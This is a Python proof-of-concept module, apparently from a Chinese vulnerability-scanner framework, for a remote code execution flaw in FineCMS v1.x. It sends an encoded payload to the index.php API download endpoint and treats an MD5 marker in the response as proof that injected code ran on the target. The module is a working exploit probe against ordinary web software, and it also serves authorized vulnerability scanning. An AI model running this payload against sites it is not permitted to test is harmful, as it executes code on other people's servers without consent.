# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FineCMS_0003'  # 平台漏洞编号，留空
    name = 'FineCMS v1.x远程代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-05-20'  # 漏洞公布时间
    desc = '''
        FineCMS是一款基于PHP+MySql开发的内容管理系统，采用MVC设计模式实现业务逻辑与表现层的适当分离，使网页设计师能够轻松设计出理想的模板，
        插件化方式开发功能易用便于扩展，支持自定义内容模型和会员模型，并且可以自定义字段，系统内置文章、图片、下载、房产、商品内容模型，
        系统表单功能可轻松扩展出留言、报名、书籍等功能，实现与内容模型、会员模型相关联，FineCMS可面向中小型站点提供重量级网站建设解决方案
        ===
        目前该cms有v1.x和v2.x两个内核的版本，貌似从官方论坛看到两个版本都在更新维护和发布，属于两个不同产品，
        v2.x是采用的CI框架编写，v1.x 最新版本是1.8 ，更新日期是2014.3.23，其中v1.x版本存在代码执行漏洞，可执行任意代码。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FineCMS'  # 漏洞应用名称
    product_version = 'v1.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '93620c73-b3a6-4521-8a7b-0e6491967e63'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload = '/index.php?c=api&a=down&file=YTJkOS81dEhyMXVWMkF5SWVxTCt5eHF3eE5ZMUM0a2ZDWjE4WUpCb09ZUHhnVkJsRGZFYjc4cXpadWNuUk9qT0NR'
            verify_url = self.target + payload
            code, head, body, errcode, log = hh.http(verify_url)
            #r = requests.get('-L %s' % verify_url)

            if 'c4ca4238a0b923820dcc509a6f75849b' in body:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
